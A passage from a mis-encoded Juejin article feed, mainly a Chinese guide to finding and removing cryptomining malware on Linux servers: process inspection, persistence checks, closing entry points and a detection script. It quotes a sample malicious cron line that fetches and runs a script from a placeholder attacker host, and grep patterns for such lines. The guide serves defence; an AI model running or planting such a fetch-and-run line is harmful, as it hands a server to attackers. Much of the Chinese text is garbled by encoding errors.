<p>3ã€æ”¯æŒä¸‹æ‹‰åˆ·æ–°ï¼Œä¸Šæ‹‰åŠ è½½æ›´å¤šï¼Œä»£ç æç®€ï¼Œä½¿ç”¨æ–¹ä¾¿ã€‚</p>
<p>4ã€åˆ·æ–°é€»è¾‘å°è£…åœ¨ EasyRefreshMixin æ··å…¥é‡Œï¼Œæ–¹ä¾¿å¤šç»„ä»¶å¯å…±ç”¨ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fshang1219178163%2Fflutter_templet_project%2Fblob%2Fv3.27.0%2Flib%2FbasicWidget%2Frefresh%2Fn_custom_scrollView.dart" target="_blank" title="https://github.com/shang1219178163/flutter_templet_project/blob/v3.27.0/lib/basicWidget/refresh/n_custom_scrollView.dart" ref="nofollow noopener noreferrer">github</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CPU é£™å‡æ˜¯æœåŠ¡å™¨è¢«æŒ–çŸ¿ç—…æ¯’æ”»å‡»æ€ä¹ˆåŠï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600955777316028454</link>    <guid>https://juejin.cn/post/7600955777316028454</guid>    <pubDate>2026-01-30T13:21:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316028454" data-draft-id="7600990891218616329" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CPU é£™å‡æ˜¯æœåŠ¡å™¨è¢«æŒ–çŸ¿ç—…æ¯’æ”»å‡»æ€ä¹ˆåŠï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T13:21:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90åæ™¨ä»”"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CPU é£™å‡æ˜¯æœåŠ¡å™¨è¢«æŒ–çŸ¿ç—…æ¯’æ”»å‡»æ€ä¹ˆåŠï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90åæ™¨ä»”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:21:43.000Z" title="Fri Jan 30 2026 13:21:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>CPU é£™å‡æ˜¯æœåŠ¡å™¨è¢«æŒ–çŸ¿ç—…æ¯’ï¼ˆå¦‚ xmrigã€kdevtmpfsiã€watchdogs ç­‰ï¼‰æ”»å‡»çš„å…¸å‹è¡¨ç°ã€‚è¿™ç±»æ¶æ„ç¨‹åºä¼šåˆ©ç”¨ä½ çš„æœåŠ¡å™¨èµ„æºè¿›è¡ŒåŠ å¯†è´§å¸æŒ–çŸ¿ï¼Œå¯¼è‡´ CPU æŒç»­ 100% å ç”¨ï¼Œç³»ç»Ÿå˜æ…¢ç”šè‡³å®•æœºã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€å¥—<strong>é’ˆå¯¹æ€§æ’æŸ¥ä¸æ¸…é™¤æ–¹æ¡ˆ</strong>ï¼Œé€‚ç”¨äº Linux ç³»ç»Ÿï¼ˆå¦‚ CentOSã€Ubuntuï¼‰ï¼š</p>
<hr/>
<h3 data-id="heading-0">ğŸ” ç¬¬ä¸€æ­¥ï¼šå¿«é€Ÿå®šä½é«˜ CPU è¿›ç¨‹</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æŸ¥çœ‹ CPU å ç”¨æœ€é«˜çš„è¿›ç¨‹</span>
top
<span class="hljs-meta prompt_">
# </span><span class="bash">æŒ‰ <span class="hljs-string">'P'</span>ï¼ˆå¤§å†™ï¼‰å¯æŒ‰ CPU ä½¿ç”¨ç‡æ’åº</span>
</code></pre>
<p>é‡ç‚¹å…³æ³¨ï¼š</p>
<ul>
<li>è¿›ç¨‹åå¯ç–‘ï¼ˆå¦‚ <code>kdevtmpfsi</code>ã€<code>xmrig</code>ã€<code>sysupdate</code>ã€<code>networkservice</code>ã€<code>watchdog</code>ã€éšæœºå­—ç¬¦ä¸²ï¼‰</li>
<li>ç”¨æˆ·ä¸æ˜¯ä½ åˆ›å»ºçš„ï¼ˆå¦‚ <code>nobody</code>ã€<code>daemon</code>ã€<code>redis</code> ç­‰ç³»ç»Ÿç”¨æˆ·è¿è¡ŒæœªçŸ¥ç¨‹åºï¼‰</li>
</ul>
<p>è®°ä¸‹ PID å’Œè¿›ç¨‹åã€‚</p>
<hr/>
<h3 data-id="heading-1">ğŸ•µï¸ ç¬¬äºŒæ­¥ï¼šæ·±å…¥åˆ†æå¯ç–‘è¿›ç¨‹</h3>
<p>å‡è®¾ä½ å‘ç°ä¸€ä¸ªå« <code>kdevtmpfsi</code> çš„è¿›ç¨‹å ç”¨äº† 95% CPUï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹è¯¥è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼ˆæ›¿æ¢ä¸ºå®é™… PIDï¼‰</span>
PID=12345
<span class="hljs-built_in">ls</span> -l /proc/<span class="hljs-variable">$PID</span>/exe          <span class="hljs-comment"># æŸ¥çœ‹å®ƒå®é™…æ‰§è¡Œçš„æ˜¯å“ªä¸ªæ–‡ä»¶</span>
<span class="hljs-built_in">cat</span> /proc/<span class="hljs-variable">$PID</span>/cmdline        <span class="hljs-comment"># æŸ¥çœ‹å¯åŠ¨å‘½ä»¤ï¼ˆå¯èƒ½å¸¦çŸ¿æ± åœ°å€ï¼‰</span>
<span class="hljs-built_in">cat</span> /proc/<span class="hljs-variable">$PID</span>/environ | <span class="hljs-built_in">tr</span> <span class="hljs-string">'\0'</span> <span class="hljs-string">'\n'</span>  <span class="hljs-comment"># æŸ¥çœ‹ç¯å¢ƒå˜é‡</span>
</code></pre>
<p>å¸¸è§è—åŒ¿è·¯å¾„ï¼š</p>
<ul>
<li><code>/tmp/</code></li>
<li><code>/dev/shm/</code></li>
<li><code>/var/tmp/</code></li>
<li><code>/usr/bin/.xxx</code>ï¼ˆéšè—æ–‡ä»¶ï¼‰</li>
<li><code>/root/.cache/</code></li>
</ul>
<hr/>
<h3 data-id="heading-2">ğŸ§¹ ç¬¬ä¸‰æ­¥ï¼šç»ˆæ­¢è¿›ç¨‹å¹¶åˆ é™¤æ–‡ä»¶</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç»ˆæ­¢è¿›ç¨‹</span>
<span class="hljs-built_in">kill</span> -9 12345

<span class="hljs-comment"># åˆ é™¤å¯¹åº”æ–‡ä»¶ï¼ˆæ ¹æ® /proc/PID/exe çš„ç»“æœï¼‰</span>
<span class="hljs-built_in">rm</span> -f /tmp/kdevtmpfsi
<span class="hljs-built_in">rm</span> -f /dev/shm/kdevtmpfsi
</code></pre>
<p>âš ï¸ <strong>æ³¨æ„</strong>ï¼šæœ‰äº›ç—…æ¯’ä¼šé€šè¿‡å®ˆæŠ¤è¿›ç¨‹æˆ–å®šæ—¶ä»»åŠ¡è‡ªåŠ¨é‡å¯ï¼æ‰€ä»¥ä¸èƒ½åª kill è¿›ç¨‹ï¼</p>
<hr/>
<h3 data-id="heading-3">â° ç¬¬å››æ­¥ï¼šæ£€æŸ¥æŒä¹…åŒ–å…¥å£ï¼ˆå…³é”®ï¼ï¼‰</h3>
<h4 data-id="heading-4">1. æ£€æŸ¥å®šæ—¶ä»»åŠ¡ï¼ˆcronï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">crontab -l                    <span class="hljs-comment"># å½“å‰ç”¨æˆ·</span>
crontab -u root -l            <span class="hljs-comment"># root ç”¨æˆ·</span>
<span class="hljs-built_in">cat</span> /etc/crontab
<span class="hljs-built_in">ls</span> /etc/cron.d/
<span class="hljs-built_in">ls</span> /var/spool/cron/crontabs/  <span class="hljs-comment"># Ubuntu è·¯å¾„</span>
<span class="hljs-built_in">ls</span> /var/spool/cron/           <span class="hljs-comment"># CentOS è·¯å¾„</span>
</code></pre>
<p>ğŸ” å¸¸è§æ¶æ„ cron ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">*<span class="hljs-regexp">/5 * * * * wget -q -O- http:/</span><span class="hljs-regexp">/æ¶æ„IP/u</span>pdate.<span class="hljs-property">sh</span> | sh
<span class="hljs-meta">@reboot</span> /tmp/.<span class="hljs-property">sysupdate</span>
</code></pre>
<p>â†’ <strong>åˆ é™¤è¿™äº›è¡Œ</strong>ï¼Œæˆ–ç›´æ¥æ¸…ç©ºå¯ç–‘ç”¨æˆ·çš„ crontabï¼š</p>
<pre><code class="hljs language-bash" lang="bash">crontab -r   <span class="hljs-comment"># æ¸…ç©ºå½“å‰ç”¨æˆ· cronï¼ˆè°¨æ…ä½¿ç”¨ï¼‰</span>
</code></pre>
<h4 data-id="heading-5">2. æ£€æŸ¥ systemd æœåŠ¡ï¼ˆè¾ƒæ–°ç—…æ¯’ä¼šä¼ªè£…æˆæœåŠ¡ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">systemctl list-unit-files --<span class="hljs-built_in">type</span>=service | grep enabled
<span class="hljs-built_in">ls</span> /etc/systemd/system/
</code></pre>
<p>åˆ é™¤å¯ç–‘æœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">systemctl stop malicious.service
systemctl <span class="hljs-built_in">disable</span> malicious.service
<span class="hljs-built_in">rm</span> -f /etc/systemd/system/malicious.service
</code></pre>
<h4 data-id="heading-6">3. æ£€æŸ¥ rc.localã€init.d ç­‰å¯åŠ¨é¡¹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /etc/rc.local
<span class="hljs-built_in">ls</span> /etc/init.d/ | grep -E <span class="hljs-string">"(sys|net|watch|update)"</span>
</code></pre>
<hr/>
<h3 data-id="heading-7">ğŸ” ç¬¬äº”æ­¥ï¼šå°å µå…¥ä¾µæºå¤´</h3>
<p>CPU é£™å‡é€šå¸¸æ˜¯<strong>å·²æœ‰æ¼æ´è¢«åˆ©ç”¨</strong>çš„ç»“æœã€‚å¸¸è§å…¥å£åŒ…æ‹¬ï¼š</p>





























<table><thead><tr><th>å…¥å£</th><th>ä¿®å¤å»ºè®®</th></tr></thead><tbody><tr><td><strong>Redis æœªæˆæƒè®¿é—®</strong></td><td>ç»‘å®š 127.0.0.1ï¼Œè®¾ç½®å¯†ç ï¼Œå…³é—­ AOF/RDB è‡ªåŠ¨åŠ è½½è„šæœ¬</td></tr><tr><td><strong>SSH å¼±å¯†ç çˆ†ç ´</strong></td><td>æ”¹ç”¨å¯†é’¥ç™»å½•ï¼Œç¦ç”¨ root ç™»å½•ï¼Œæ”¹ SSH ç«¯å£</td></tr><tr><td><strong>Web åº”ç”¨æ¼æ´ï¼ˆå¦‚ WordPressã€ThinkPHPï¼‰</strong></td><td>å‡çº§ CMS/æ¡†æ¶ï¼Œåˆ é™¤æœªä½¿ç”¨æ’ä»¶</td></tr><tr><td><strong>Docker API æš´éœ²</strong></td><td>ä¸è¦å°† 2375 ç«¯å£æš´éœ²åˆ°å…¬ç½‘</td></tr><tr><td><strong>Nginx/Apache é…ç½®é”™è¯¯å¯¼è‡´ç›®å½•éå†</strong></td><td>æ£€æŸ¥é…ç½®ï¼Œç¦æ­¢åˆ—å‡ºç›®å½•</td></tr></tbody></table>
<p>ğŸ‘‰ <strong>ç«‹å³æ£€æŸ¥ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æœ€è¿‘çš„ SSH ç™»å½•ï¼ˆæ˜¯å¦æœ‰å¼‚å¸¸ IPï¼‰</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/auth.log | <span class="hljs-built_in">tail</span> -20    <span class="hljs-comment"># Ubuntu</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/secure | <span class="hljs-built_in">tail</span> -20      <span class="hljs-comment"># CentOS</span>

<span class="hljs-comment"># æŸ¥çœ‹ç›‘å¬ç«¯å£ï¼ˆæ˜¯å¦æœ‰ Redis 6379ã€MongoDB 27017 æš´éœ²ï¼Ÿï¼‰</span>
ss -tulnp
</code></pre>
<hr/>
<h3 data-id="heading-8">ğŸ›¡ï¸ ç¬¬å…­æ­¥ï¼šåŠ å›ºä¸ç›‘æ§</h3>
<ol>
<li>
<p><strong>å¯ç”¨é˜¿é‡Œäº‘ã€Œäº‘å®‰å…¨ä¸­å¿ƒã€</strong></p>
<ul>
<li>å…è´¹ç‰ˆå³å¯æ£€æµ‹æŒ–çŸ¿è¡Œä¸º</li>
<li>å¼€å¯ã€Œç—…æ¯’æŸ¥æ€ã€+ã€Œå…¥ä¾µæ£€æµ‹ã€</li>
</ul>
</li>
<li>
<p><strong>å®‰è£…å®æ—¶ç›‘æ§å·¥å…·</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£… atopï¼ˆè®°å½•å†å²èµ„æºä½¿ç”¨ï¼‰</span>
apt install atop -y   <span class="hljs-comment"># æˆ– yum install atop</span>
systemctl <span class="hljs-built_in">enable</span> --now atop
</code></pre>
</li>
<li>
<p><strong>é™åˆ¶æ™®é€šç”¨æˆ·æ‰§è¡Œæƒé™</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¾‹å¦‚ç¦æ­¢ /tmp æ‰§è¡Œç¨‹åºï¼ˆåœ¨ /etc/fstab ä¸­æ·»åŠ  noexecï¼‰</span>
mount -o remount,noexec,nosuid /tmp
mount -o remount,noexec,nosuid /dev/shm
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-9">ğŸ’£ æç«¯å»ºè®®ï¼šé‡è£…ç³»ç»Ÿ</h3>
<p>å¦‚æœåå¤æ„ŸæŸ“ã€æ— æ³•å½»åº•æ¸…é™¤ï¼Œ<strong>æœ€å®‰å…¨çš„æ–¹å¼æ˜¯</strong>ï¼š</p>
<ol>
<li>åœ¨é˜¿é‡Œäº‘æ§åˆ¶å° <strong>åˆ›å»ºå½“å‰ç£ç›˜å¿«ç…§</strong>ï¼ˆç”¨äºå–è¯ï¼‰</li>
<li><strong>æ›´æ¢ç³»ç»Ÿç›˜</strong>ï¼ˆé‡è£…å¹²å‡€çš„å®˜æ–¹é•œåƒï¼‰</li>
<li><strong>ä»…æ¢å¤ä¸šåŠ¡æ•°æ®</strong>ï¼ˆä¸è¦æ¢å¤å¯æ‰§è¡Œæ–‡ä»¶ã€è„šæœ¬ã€é…ç½®æ–‡ä»¶ï¼‰</li>
<li><strong>é‡æ–°éƒ¨ç½²åº”ç”¨ï¼Œå¹¶ä¸¥æ ¼éµå¾ªå®‰å…¨è§„èŒƒ</strong></li>
</ol>
<hr/>
<h3 data-id="heading-10">âœ… é™„ï¼šå¿«é€Ÿæ£€æµ‹è„šæœ¬ï¼ˆå¯å¤åˆ¶è¿è¡Œï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"=== é«˜ CPU è¿›ç¨‹ ==="</span>
ps aux --<span class="hljs-built_in">sort</span>=-%cpu | <span class="hljs-built_in">head</span> -n 10

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== å¯ç–‘å®šæ—¶ä»»åŠ¡ ==="</span>
grep -r <span class="hljs-string">""</span> /var/spool/cron/ /etc/cron* 2&gt;/dev/null | grep -v <span class="hljs-string">"^#"</span> | grep -E <span class="hljs-string">".(sh|py|pl|elf)|wget|curl|http"</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== /tmp å’Œ /dev/shm ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ ==="</span>
find /tmp /dev/shm -<span class="hljs-built_in">type</span> f -executable 2&gt;/dev/null

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== å¤–è¿å¯ç–‘ IPï¼ˆæŒ–çŸ¿å¸¸è¿å¢ƒå¤–ï¼‰==="</span>
ss -tulnp | grep -E <span class="hljs-string">"(4444|5555|3333|stratum)"</span>  <span class="hljs-comment"># å¸¸è§çŸ¿æ± ç«¯å£</span>
</code></pre>
<p>ä¿å­˜ä¸º <code>check_mining.sh</code>ï¼Œ<code>chmod +x</code> åè¿è¡Œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis æ‰¹é‡æ’å…¥ä»5åˆ†é’Ÿç¼©çŸ­åˆ°3ç§’ï¼Ÿæˆ‘çš„ä¸‰ä¸ªå…³é”®ä¼˜åŒ–]]></title>    <link>https://juejin.cn/post/7600982613653766194</link>    <guid>https://juejin.cn/post/7600982613653766194</guid>    <pubDate>2026-01-30T13:23:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600982613653766194" data-draft-id="7600787795478069294" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis æ‰¹é‡æ’å…¥ä»5åˆ†é’Ÿç¼©çŸ­åˆ°3ç§’ï¼Ÿæˆ‘çš„ä¸‰ä¸ªå…³é”®ä¼˜åŒ–"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-30T13:23:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çš®çš®æ—551"/> <meta itemprop="url" content="https://juejin.cn/user/2447981921436084"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis æ‰¹é‡æ’å…¥ä»5åˆ†é’Ÿç¼©çŸ­åˆ°3ç§’ï¼Ÿæˆ‘çš„ä¸‰ä¸ªå…³é”®ä¼˜åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2447981921436084/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çš®çš®æ—551
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:23:21.000Z" title="Fri Jan 30 2026 13:23:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 